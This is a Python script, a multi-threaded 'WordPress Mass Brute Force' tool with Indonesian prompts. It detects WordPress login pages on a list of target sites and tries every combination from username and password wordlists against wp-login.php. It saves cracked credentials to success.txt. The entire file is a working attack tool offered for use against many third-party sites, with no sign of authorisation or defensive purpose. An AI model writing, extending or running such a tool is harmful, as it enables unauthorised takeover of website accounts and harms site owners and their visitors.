import requests
import time
import os
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Configuration
USERNAME_FILE = "username.txt"
PASSWORD_FILE = "password.txt"
TARGET_FILE = "targets.txt"
SAVE_FILE = "success.txt"
MAX_THREADS = 25
TIMEOUT = 8

# WordPress login paths (optimized detection)
WP_LOGIN_PATHS = [
    "/wp-login.php",
    "/wp-admin",
    "/login",
    "/admin",
    "/wp/wp-login.php",
    "/wordpress/wp-login.php",
    "/cms/wp-login.php"
]

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_wordlist(filename):
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[ {Fore.RED}error{Style.RESET_ALL} ] File {filename} tidak ditemukan!")
        return []

def detect_wp_login(base_url):
    """Smart WordPress login page detection"""
    for path in WP_LOGIN_PATHS:
        test_url = f"{base_url.rstrip('/')}{path}"
        try:
            response = requests.head(test_url, timeout=TIMEOUT, allow_redirects=True)
            final_url = response.url.lower()
            
            # WordPress indicators
            if any(x in final_url for x in ["wp-login", "wp-admin", "login"]):
                return final_url
            
            # Content-based detection
            content = requests.get(test_url, timeout=TIMEOUT).text.lower()
            if "wp-content" in content or "wordpress" in content:
                return test_url
                
        except requests.RequestException:
            continue
    return None

def brute_force(target, username, password):
    """WordPress login brute force with exact output format"""
    try:
        with requests.Session() as session:
            response = session.post(
                target,
                data={
                    "log": username,
                    "pwd": password,
                    "wp-submit": "Log In",
                    "redirect_to": target.replace("wp-login.php", "wp-admin/")
                },
                timeout=TIMEOUT,
                allow_redirects=False
            )
            
            # Success detection
            if response.status_code == 302 and "wp-admin" in response.headers.get('Location', ''):
                with open(SAVE_FILE, 'a') as f:
                    f.write(f"{target}|{username}:{password}\n")
                print(f"[ {Fore.GREEN}success{Style.RESET_ALL} ] {target} {username}:{password}")  # Exact requested format
                return True
    except Exception:
        pass
    return False

def process_target(target):
    """Handle each target with credentials"""
    if not target.startswith(('http://', 'https://')):
        target = f"http://{target}"
    
    login_url = detect_wp_login(target)
    if not login_url:
        print(f"[ {Fore.RED}gagal{Style.RESET_ALL} ] {target}")
        return
    
    usernames = load_wordlist(USERNAME_FILE)
    passwords = load_wordlist(PASSWORD_FILE)
    
    if not usernames or not passwords:
        return
    
    found = False
    for username in usernames:
        for password in passwords:
            if brute_force(login_url, username, password):
                found = True
                break  # Stop after first success per target
        if found:
            break

def main():
    clear_screen()
    print(f"\n{Fore.GREEN}=== WordPress Mass Brute Force ==={Style.RESET_ALL}\n")
    
    # Mode selection
    print("Pilih mode:")
    print("1. Single target (manual)")
    print("2. Multiple targets (file)")
    choice = input("Pilihan (1/2): ").strip()
    
    targets = []
    
    if choice == "1":
        target = input("\nMasukkan URL target: ").strip()
        targets.append(target)
    elif choice == "2":
        if not os.path.exists(TARGET_FILE):
            print(f"\n[ {Fore.RED}error{Style.RESET_ALL} ] Buat file {TARGET_FILE} terlebih dahulu!")
            return
        targets = load_wordlist(TARGET_FILE)
    else:
        print("\nPilihan tidak valid!")
        return
    
    if not targets:
        print("\nTidak ada target yang dimasukkan!")
        return
    
    print(f"\n[ * ] Memulai scan terhadap {len(targets)} target")
    print("[ * ] Tekan Ctrl+C untuk menghentikan\n")
    
    start_time = time.time()
    success_count = 0
    
    # Process targets
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        results = list(executor.map(process_target, targets))
        success_count = len(load_wordlist(SAVE_FILE))  # Count successes from file
    
    # Results summary
    elapsed = time.time() - start_time
    print(f"\n[ * ] Selesai dalam {elapsed:.2f} detik")
    
    if success_count > 0:
        print(f"[ {Fore.GREEN}result{Style.RESET_ALL} ] Selamat anda success [ hasil {success_count} ]")
    else:
        print(f"[ {Fore.RED}result{Style.RESET_ALL} ] Anda tidak mendapatkan [ hasil 0 ]")
    print(f"[ * ] Hasil tersimpan di {SAVE_FILE}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[ ! ] Dihentikan oleh pengguna")
    except Exception as e:
        print(f"\n[ {Fore.RED}error{Style.RESET_ALL} ] {str(e)}")
